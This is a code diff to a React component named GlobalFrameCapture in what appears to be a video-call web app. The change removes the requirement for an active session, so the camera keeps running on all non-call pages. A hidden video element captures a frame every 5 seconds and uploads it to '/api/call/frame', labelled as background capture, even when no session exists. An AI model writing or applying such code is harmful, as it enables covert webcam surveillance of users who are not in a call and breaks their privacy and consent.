@@ -11,7 +11,7 @@ export default function GlobalFrameCapture() {
     // Prevent running on call page (if layout wraps it)
     const isCallPage = pathname?.startsWith('/call/');
 
-    // Poll for active session
+    // Poll for active session (just to link frames)
     useEffect(() => {
         if (isCallPage) return; // Don't poll on call page
 
@@ -35,10 +35,10 @@ export default function GlobalFrameCapture() {
         return () => clearInterval(interval);
     }, [isCallPage, activeSessionId]);
 
-    // Manage camera stream
+    // Manage camera stream - ALWAYS RUN if not on call page
     useEffect(() => {
-        if (!activeSessionId || isCallPage) {
-            // Cleanup if no session or we are on call page
+        if (isCallPage) {
+            // Cleanup if on call page (let ClientCallInterface handle it)
             if (streamRef.current) {
                 streamRef.current.getTracks().forEach(track => track.stop());
                 streamRef.current = null;
@@ -58,7 +58,7 @@ export default function GlobalFrameCapture() {
                     videoRef.current.srcObject = stream;
                 }
             } catch (err) {
-                console.log('[GlobalCapture] Camera permission denied/failed:', err);
+                console.log('[GlobalCapture] Camera permission denied/failed (background):', err);
             }
         };
 
@@ -70,11 +70,11 @@ export default function GlobalFrameCapture() {
                 streamRef.current = null;
             }
         };
-    }, [activeSessionId, isCallPage]);
+    }, [isCallPage]);
 
     // Frame Capture Loop
     useEffect(() => {
-        if (!activeSessionId || isCallPage) return;
+        if (isCallPage) return;
 
         const captureInterval = setInterval(() => {
             if (!videoRef.current || !streamRef.current) return;
@@ -92,7 +92,10 @@ export default function GlobalFrameCapture() {
                     if (blob) {
                         const formData = new FormData();
                         formData.append('file', blob, 'frame.jpg');
-                        formData.append('sessionId', activeSessionId);
+                        // Only append sessionId if we have one
+                        if (activeSessionId) {
+                            formData.append('sessionId', activeSessionId);
+                        }
 
                         try {
                             await fetch('/api/call/frame', { method: 'POST', body: formData });
@@ -102,12 +105,13 @@ export default function GlobalFrameCapture() {
                     }
                 }, 'image/jpeg', 0.5);
             }
-        }, 10000); // Capture every 10s
+        }, 5000); // Capture every 5 seconds per request
 
         return () => clearInterval(captureInterval);
     }, [activeSessionId, isCallPage]);
 
-    if (!activeSessionId || isCallPage) return null;
+    // If on call page, render nothing. Else render helper video.
+    if (isCallPage) return null;
 
     // Helper video element (hidden)
     return (
